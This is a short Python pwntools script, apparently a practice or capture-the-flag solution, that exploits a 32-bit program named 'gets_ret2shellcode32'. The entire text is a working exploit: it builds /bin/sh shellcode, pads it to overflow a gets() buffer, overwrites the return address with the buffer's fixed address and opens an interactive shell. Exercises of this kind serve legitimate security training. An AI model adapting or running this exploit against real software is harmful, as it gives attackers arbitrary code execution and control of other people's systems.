from pwn import *
p = process('gets_ret2shellcode32')
#context(log_level = 'debug', arch = 'i386', os = 'linux')
bufaddr=0x804a060
payload=asm(shellcraft.sh())
#print len(payload)

p.sendline(payload.ljust(44,'A')+p32(bufaddr))
p.interactive()
